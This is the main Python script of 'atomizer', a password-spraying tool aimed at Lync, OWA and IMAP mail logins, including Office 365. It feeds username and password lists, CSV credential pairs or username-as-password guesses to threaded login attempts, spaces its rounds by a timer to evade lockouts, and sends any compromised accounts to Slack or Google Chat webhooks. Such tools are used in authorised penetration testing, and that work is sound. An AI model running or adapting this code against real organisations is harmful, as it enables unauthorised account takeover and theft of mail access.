#!/usr/bin/env python3

"""
Usage:
    atomizer (lync|owa|imap) <target> <password> <userfile> [--targetPort PORT] [--threads THREADS] [--debug]
    atomizer (lync|owa|imap) <target> <passwordfile> <userfile> --interval <TIME> [--gchat <URL>] [--slack <URL>] [--targetPort PORT][--threads THREADS] [--debug]
    atomizer (lync|owa|imap) <target> --csvfile CSVFILE [--user-row-name NAME] [--pass-row-name NAME] [--targetPort PORT] [--threads THREADS] [--debug]
    atomizer (lync|owa|imap) <target> --user-as-pass USERFILE [--targetPort PORT] [--threads THREADS] [--debug]
    atomizer (lync|owa|imap) <target> --recon [--debug]
    atomizer -h | --help
    atomizer -v | --version

Arguments:
    target         target domain or url
    password       password to spray
    userfile       file containing usernames (one per line)
    passwordfile   file containing passwords (one per line)

Options:
    -h, --help               show this screen
    -v, --version            show version
    -c, --csvfile CSVFILE    csv file containing usernames and passwords
    -i, --interval TIME      spray at the specified interval [format: "H:M:S"]
    -t, --threads THREADS    number of concurrent threads to use [default: 3]
    -d, --debug              enable debug output
    -p, --targetPort PORT    target port of the IMAP server (IMAP only) [default: 993]
    --recon                  only collect info, don't password spray
    --gchat URL              gchat webhook url for notification
    --slack URL              slack webhook url for notification
    --user-row-name NAME     username row title in CSV file [default: Email Address]
    --pass-row-name NAME     password row title in CSV file [default: Password]
    --user-as-pass USERFILE  use the usernames in the specified file as the password (one per line)
"""

import logging
import signal
import asyncio
import concurrent.futures
import sys
import csv
from functools import partial
from pathlib import Path
from docopt import docopt
from core.utils.messages import *
from core.sprayers import Lync, OWA, IMAP
from core.utils.time import countdown_timer, get_utc_time
from core.webhooks import gchat, slack


class Atomizer:
    def __init__(self, loop, target, threads=3, debug=False):
        self.loop = loop
        self.target = target
        self.sprayer = None
        self.threads = int(threads)
        self.debug = debug
        # Maximum 3 concurrent tasks per thread.
        self.sync = asyncio.BoundedSemaphore(self.threads * 3)

        log_format = '%(threadName)10s %(name)18s: %(message)s' if debug else '%(message)s'

        logging.basicConfig(
            level=logging.DEBUG if debug else logging.INFO,
            format=log_format,
            stream=sys.stderr,
        )

        self.executor = concurrent.futures.ThreadPoolExecutor(
            max_workers=self.threads,
        )

    def lync(self):
        self.sprayer = Lync(
            target=self.target
        )

    def owa(self):
        self.sprayer = OWA(
            target=self.target
        )

    def imap(self, port):
        self.sprayer = IMAP(
            target=self.target,
            port=port
        )

    def _atomize(func, username, password, sync):
        func(username, password)
        sync.release()

    async def atomize(self, userfile, password):
        log = logging.getLogger('atomize')
        log.debug('atomizing...')

        auth_function = self.sprayer.auth_O365 if self.sprayer.O365 else self.sprayer.auth

        log.debug('creating executor tasks')
        logging.info(print_info(f"Starting spray at {get_utc_time()} UTC"))

        pending = []
        for username in userfile:
            await self.sync.acquire()
            task = self.loop.run_in_executor(self.executor, partial(Atomizer._atomize, auth_function, username.strip(), password, self.sync))
            pending.append(task)

        log.debug('waiting for executor tasks')
        await asyncio.wait(pending)
        log.debug('exiting')

    async def atomize_csv(self, csvreader: csv.DictReader, user_row_name='Email Address', pass_row_name='Password'):
        log = logging.getLogger('atomize_csv')
        log.debug('atomizing...')

        auth_function = self.sprayer.auth_O365 if self.sprayer.O365 else self.sprayer.auth

        log.debug('creating executor tasks')
        logging.info(print_info(f"Starting spray at {get_utc_time()} UTC"))
        blocking_tasks = [
            self.loop.run_in_executor(self.executor, partial(auth_function, username=row[user_row_name], password=row[pass_row_name]))
            for row in csvreader
        ]

        log.debug('waiting for executor tasks')
        await asyncio.wait(blocking_tasks)
        log.debug('exiting')

    async def atomize_user_as_pass(self, userfile):
        log = logging.getLogger('atomize_user_as_pass')
        log.debug('atomizing...')

        auth_function = self.sprayer.auth_O365 if self.sprayer.O365 else self.sprayer.auth

        log.debug('creating executor tasks')
        logging.info(print_info(f"Starting spray at {get_utc_time()} UTC"))
        blocking_tasks = [
            self.loop.run_in_executor(self.executor, partial(auth_function, username=username.strip(), password=username.strip().split('\\')[-1:][0]))
            for username in userfile
        ]

        log.debug('waiting for executor tasks')
        await asyncio.wait(blocking_tasks)
        log.debug('exiting')

    def shutdown(self):
        self.sprayer.shutdown()

def add_handlers(loop, callback):
    for sig in (signal.SIGINT, signal.SIGTERM):
        loop.add_signal_handler(sig, callback)

def remove_handlers(loop):
    for sig in (signal.SIGINT, signal.SIGTERM):
        loop.remove_signal_handler(sig)

if __name__ == "__main__":
    args = docopt(__doc__, version="1.0.0dev")
    loop = asyncio.get_event_loop()

    atomizer = Atomizer(
        loop=loop,
        target=args['<target>'].lower(),
        threads=args['--threads'],
        debug=args['--debug']
    )

    logging.debug(args)

    for input_file in [args['<userfile>'], args['--csvfile'], args['--user-as-pass']]:
        if input_file:
            file_path = Path(input_file)
            if not file_path.exists() or not file_path.is_file():
                logging.error(print_bad("Path to <userfile>/--csvfile/--user-as-pass invalid!"))
                sys.exit(1)

    if args['lync']:
        atomizer.lync()
    elif args['owa']:
        atomizer.owa()
    elif args['imap']:
        atomizer.imap(args['--targetPort'])

    if not args['--recon']:
        add_handlers(loop, atomizer.shutdown)

        if args['--interval']:
            popped_accts = 0
            with open(args['<passwordfile>']) as passwordfile:
                password = passwordfile.readline()
                while password != "":
                    with open(args['<userfile>']) as userfile:
                            loop.run_until_complete(
                                atomizer.atomize(
                                    userfile=userfile,
                                    password=password.strip()
                                )
                            )

                            if popped_accts != len(atomizer.sprayer.valid_accounts):
                                popped_accts = len(atomizer.sprayer.valid_accounts)

                                if args['--gchat']:
                                    gchat(args['--gchat'], args['<target>'], atomizer.sprayer)
                                if args['--slack']:
                                    slack(args['--slack'], args['<target>'], atomizer.sprayer)

                            password = passwordfile.readline()
                            if password:
                                remove_handlers(loop) # Intercept signals.
                                # Wait for next interval and abort if the user hits Ctrl-C.
                                if not countdown_timer(*args['--interval'].split(':')): break
                                add_handlers(loop, atomizer.shutdown)

        elif args['<userfile>']:
            with open(args['<userfile>']) as userfile:
                    loop.run_until_complete(
                        atomizer.atomize(
                            userfile=userfile,
                            password=args['<password>']
                        )
                    )

        elif args['--csvfile']:
            with open(args['--csvfile']) as csvfile:
                    reader = csv.DictReader(csvfile)
                    loop.run_until_complete(
                        atomizer.atomize_csv(
                            csvreader=reader,
                            user_row_name=args['--user-row-name'],
                            pass_row_name=args['--pass-row-name']
                        )
                    )

        elif args['--user-as-pass']:
            with open(args['--user-as-pass']) as userfile:
                    loop.run_until_complete(atomizer.atomize_user_as_pass(userfile))

        atomizer.shutdown()
